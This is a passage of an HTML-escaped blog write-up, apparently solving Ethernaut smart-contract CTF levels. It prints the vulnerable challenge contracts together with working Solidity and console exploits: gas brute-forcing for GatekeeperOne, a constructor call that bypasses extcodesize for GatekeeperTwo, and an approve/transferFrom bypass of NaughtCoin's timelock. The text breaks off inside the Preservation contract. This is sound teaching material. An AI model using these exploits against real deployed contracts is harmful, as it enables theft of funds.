&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.6.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;.&#x2F;chall&#x2F;GatekeeperOne.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    GatekeeperOne level13 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GatekeeperOne&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xF4F13D94A1c5A8e51DED1692171bC67260289E5E&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes8&lt;&#x2F;span&gt;&lt;span&gt; _gateKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= bytes8&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xFFFFFFFF0000FFFF&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        for (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;; i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;300&lt;&#x2F;span&gt;&lt;span&gt;; i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; success, ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(level13).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;{gas: i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8191 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;enter(bytes8)&amp;quot;, _gateKey));
&lt;&#x2F;span&gt;&lt;span&gt;            if (success) {
&lt;&#x2F;span&gt;&lt;span&gt;                break;
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;em&gt;solidity changes so fast… only found 0.6.3 could compile this(with &lt;code&gt;Explicit type conversion&lt;&#x2F;code&gt; and &lt;code&gt;lower level call{}()&lt;&#x2F;code&gt; )&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;gatekeeper-two&quot;&gt;GateKeeper Two&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GatekeeperTwo &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; entrant;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateOne&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender != tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateTwo&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; x;
&lt;&#x2F;span&gt;&lt;span&gt;    assembly { x := &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;extcodesize&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;caller&lt;&#x2F;span&gt;&lt;span&gt;()) }
&lt;&#x2F;span&gt;&lt;span&gt;    require(x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateThree&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes8 &lt;&#x2F;span&gt;&lt;span&gt;_gateKey) {
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes8&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;)))) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;^ uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;type(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes8 &lt;&#x2F;span&gt;&lt;span&gt;_gateKey) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public gateOne gateTwo gateThree&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey) returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    entrant &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Still three modifier:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;gateOne: same with the former challenge&lt;&#x2F;li&gt;
&lt;li&gt;gateTwo: caller’s code size should be 0, and will be satisfied if calling in constructor.&lt;&#x2F;li&gt;
&lt;li&gt;gateTree: &lt;code&gt;uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)&lt;&#x2F;code&gt;, equivalent to &lt;code&gt;uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max) == uint64(_gateKey)&lt;&#x2F;code&gt; and can be calculated in this way.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;.&#x2F;chall&#x2F;GateKeeperTwo.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; Instance;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_addr) {
&lt;&#x2F;span&gt;&lt;span&gt;      Instance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _addr;
&lt;&#x2F;span&gt;&lt;span&gt;      unchecked{
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes8&lt;&#x2F;span&gt;&lt;span&gt; key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= bytes8&lt;&#x2F;span&gt;&lt;span&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes8&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;type(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;max  &lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GatekeeperTwo&lt;&#x2F;span&gt;&lt;span&gt;(Instance).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;(key);
&lt;&#x2F;span&gt;&lt;span&gt;      }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;naught-coin&quot;&gt;naught coin&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NaughtCoin &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;ERC20 &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; string public constant name = &amp;#39;NaughtCoin&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; string public constant symbol = &amp;#39;0x0&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; uint public constant decimals = 18;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint public&lt;&#x2F;span&gt;&lt;span&gt; timeLock &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= block&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;timestamp + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;365 days&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 public&lt;&#x2F;span&gt;&lt;span&gt; INITIAL_SUPPLY;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; player;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_player) 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;NaughtCoin&amp;#39;, &amp;#39;0x0&amp;#39;) {
&lt;&#x2F;span&gt;&lt;span&gt;    player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _player;
&lt;&#x2F;span&gt;&lt;span&gt;    INITIAL_SUPPLY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1000000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;**uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;decimals&lt;&#x2F;span&gt;&lt;span&gt;()));
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; _totalSupply = INITIAL_SUPPLY;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; _balances[player] = INITIAL_SUPPLY;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(player, INITIAL_SUPPLY);
&lt;&#x2F;span&gt;&lt;span&gt;    emit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;), player, INITIAL_SUPPLY);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;_value) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;override public lockTokens &lt;&#x2F;span&gt;&lt;span&gt;returns(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(_to, _value);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;lockTokens&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender ==&lt;&#x2F;span&gt;&lt;span&gt; player) {
&lt;&#x2F;span&gt;&lt;span&gt;      require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;block&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;timestamp &amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; timeLock);
&lt;&#x2F;span&gt;&lt;span&gt;      _;
&lt;&#x2F;span&gt;&lt;span&gt;    } else {
&lt;&#x2F;span&gt;&lt;span&gt;     _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  } 
&lt;&#x2F;span&gt;&lt;span&gt;} 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This contract is inherited from &lt;a href=&quot;https:&#x2F;&#x2F;docs.openzeppelin.com&#x2F;contracts&#x2F;3.x&#x2F;api&#x2F;token&#x2F;erc20&quot;&gt;ERC20&lt;&#x2F;a&gt; and overrided the function &lt;code&gt;transfer&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Just have a view of official documents will find the function &lt;code&gt;approval&lt;&#x2F;code&gt; and &lt;code&gt;transferFrom&lt;&#x2F;code&gt;, which is exploitable.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;contract.approve(player,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;toWei&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;1000000&amp;quot;))
&lt;&#x2F;span&gt;&lt;span&gt;contract.transferFrom(player,contract.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;toWei&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;1000000&amp;quot;))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;preservation&quot;&gt;Preservation&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Preservation &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; public library contracts 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; timeZone1Library;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; timeZone2Library;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; owner; 
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; storedTime;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Sets the function signature for delegatecall
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes4 constant&lt;&#x2F;span&gt;&lt;span&gt; setTimeSignature &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= bytes4&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;setTime(uint256)&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_timeZone1LibraryAddress, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_timeZone2LibraryAddress) {
